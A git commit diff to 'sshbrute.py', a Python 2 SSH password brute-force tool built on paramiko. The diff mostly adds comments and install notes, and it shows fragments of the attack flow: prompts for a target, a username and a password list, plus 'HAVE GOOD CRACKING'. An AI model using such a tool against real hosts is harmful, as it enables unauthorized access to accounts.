72d1fe88708e4da6a106068eb0999bb9e7c56687
kingbiagio <35268328+kingbiagio@users.noreply.github.com>
2018-01-15 13:19:18 +0100

    Update sshbrute.py

--- sshbrute.py
+++ sshbrute.py
@@ -1,6 +1,10 @@
 #!/usr/bin/python2
 #
-# Simple ssh bruteforce
+# Author Biagio
+# Simple ssh brute
+# requirements termcolor, paramiko 
+# "pip install termcolor"; pip install paramiko
+# 
 
 import paramiko
 import time
@@ -10,23 +14,23 @@ import socket
 from termcolor import *
 from threading import *
 
-global host, username, input_file
+global host, username, input_file #global variables
 
 line = "\n-------------------------------------------------------------------------\n"
 
 print (colored("<<< [+] Ssh Bruteforce >>>",'yellow'))
 print(colored("[?] Press Ctrl+c tu quit\n",'grey'))
 try:
-	host= raw_input (colored("[+] Enter Target: " ,'blue'))
-	username= raw_input(colored("[+] Enter SSH Username: ",'blue'))
-	input_file= raw_input(colored("[+] Enter Path Password list: ", 'blue'))
-	print ("[+] HAVE GOOD CRACKING ;)")
+	host= raw_input (colored("[+] Enter Target: " ,'blue'))# just banner
+	username= raw_input(colored("[+] Enter SSH Username: ",'blue'))#just banner
+	input_file= raw_input(colored("[+] Enter Path Password list: ", 'blue'))# just banner
+	print ("[+] HAVE GOOD CRACKING ;)")#just banner
 
 	if os.path.exists(input_file)== False:
 		print (colored("\n[-] File Path Doesn't Exist!",'red'))
 		sys.exit(4)
 
-except KeyboardInterrupt:
+except KeyboardInterrupt:# if user press Ctrl+c 
 	print (colored("\n\n[*] Proccess Stopped By User", 'red'))
 	print(colored("[+] See You ;)",'yellow'))
 	sys.exit(3)
@@ -62,8 +66,8 @@ for i in input_file.readlines():
 		elif response==2: #[!]Connection Refused
 			print(colored("[?] Unbale to Connect to Target: %s ,maybe Host is down or there is a Firewall behind" %(host),'yellow'))
 			sys.exit(2)
-
-	except KeyboardInterrupt:
+			
+	except KeyboardInterrupt:# If user press Ctrl+c
 		print (colored("\n\n[*] Proccess Stopped By User",'red'))
 		print(colored("[+] See You ;)"))
 		sys.exit(3)
